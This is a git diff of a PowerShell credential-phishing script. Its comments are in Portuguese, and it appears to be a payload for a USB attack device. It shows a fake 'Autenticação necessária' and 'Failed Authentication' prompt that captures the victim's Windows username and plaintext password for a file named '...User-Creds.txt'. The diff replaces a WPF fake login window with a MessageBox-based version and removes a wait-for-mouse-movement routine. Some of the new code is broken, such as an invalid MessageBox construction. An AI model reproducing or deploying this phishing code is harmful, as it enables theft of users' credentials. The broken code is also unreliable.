@@ -1,8 +1,8 @@
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
-<#
-function Get-Creds {
+
+<# function Get-Creds {
 
     $form = $null
 
@@ -40,110 +40,28 @@ function Get-Creds {
 
     while ($form -eq $null) {
 
-        # WPF-based Credential Prompt
-        Add-Type -AssemblyName PresentationCore,PresentationFramework 
+        # Utilize MessageBox para personalizar o prompt
+        $msgBox = New-Object System.Windows.Forms.MessageBox
 
-        $window = New-Object System.Windows.Window
-        $window.Title = "Autenticação necessária"
-        $window.SizeToContent = 'WidthAndHeight'  
-        $window.Icon = # Add a path to an icon file if you'd like
+        # Personalizar o prompt
+        $msgBox.Text = "Autenticação necessária"  # Título
+        $msgBox.Icon = [System.Windows.MessageBoxIcon]::Warning  # Ícone
+        $msgBox.Buttons = [System.Windows.MessageBoxButton]::OK  # Botões
 
-        $grid = New-Object System.Windows.Controls.Grid
-        $grid.Margin = 10 
-        $window.Content = $grid
+        # Resultado do prompt
+        if ($msgBox.ShowDialog() -eq "OK") {
+            $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName)
+            $cred.getnetworkcredential().password 
 
-        # Labels and Textboxes
-        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
-        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
-        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
-        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
-        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
-
-        $usernameLabel = New-Object System.Windows.Controls.Label
-        $usernameLabel.Content = "Nome de usuário:" 
-        $usernameTextbox = New-Object System.Windows.Controls.TextBox
-        $passwordLabel = New-Object System.Windows.Controls.Label
-        $passwordLabel.Content = "Senha:" 
-        $passwordTextbox = New-Object System.Windows.Controls.PasswordBox
-
-        Grid.SetRow($usernameLabel, 0)
-        Grid.SetColumn($usernameLabel, 0)
-        Grid.SetRow($usernameTextbox, 0)
-        Grid.SetColumn($usernameTextbox, 1) 
-        Grid.SetRow($passwordLabel, 1)
-        Grid.SetColumn($passwordLabel, 0)
-        Grid.SetRow($passwordTextbox, 1)
-        Grid.SetColumn($passwordTextbox, 1)
-
-        $grid.Children.Add($usernameLabel) | Out-Null
-        $grid.Children.Add($usernameTextbox) | Out-Null
-        $grid.Children.Add($passwordLabel) | Out-Null
-        $grid.Children.Add($passwordTextbox) | Out-Null
-
-        # Submit Button 
-        $submitButton = New-Object System.Windows.Controls.Button
-        $submitButton.Content = "Entrar"
-        $submitButton.Add_Click({
-            # Capture username and password here
-            $username = $usernameTextbox.Text
-            $password = $passwordTextbox.SecurePassword # SecurePassword for security
-            $credsObject = New-Object System.Net.NetworkCredential($username, $password)
-            
-            # Close window
-            $window.Close() 
-            $form = $credsObject 
-        })
-
-        Grid.SetRow($submitButton, 2)
-        Grid.SetColumnSpan($submitButton, 2) 
-        $grid.Children.Add($submitButton) | Out-Null 
-
-        # Remember Me Checkbox
-        $rememberMeCheckbox = New-Object System.Windows.Controls.CheckBox
-        $rememberMeCheckbox.Content = "Lembrar-me"
-        Grid.SetRow($rememberMeCheckbox, 2)
-        Grid.SetColumn($rememberMeCheckbox, 1)
-        $grid.Children.Add($rememberMeCheckbox) | Out-Null
-
-        # Window Styling
-        $window.Background = '#fff'
-        $usernameLabel.Foreground = '#333'
-        $usernameTextbox.Background = '#ddd'
-        $passwordLabel.FontSize = 16
-        $submitButton.Width = 100
-        $submitButton.Margin = 5
-
-        $window.ShowDialog()  
-
-        # Rest of your function logic (error checking, credential return) 
-        if([string]::IsNullOrWhiteSpace($password)) { 
-            # ... your existing error message code ... 
+            if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+                # ... (seu código de tratamento de erros) ... 
+            } else {
+                $creds = $cred.GetNetworkCredential() | fl
+                return $creds
+            }
         } else {
-            $creds = $credsObject  # Since we captured the creds object already
-            return $creds
-        }
-    }
-}
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+            # O usuário cancelou ou fechou o prompt
+            $form = $null 
         }
     }
 }
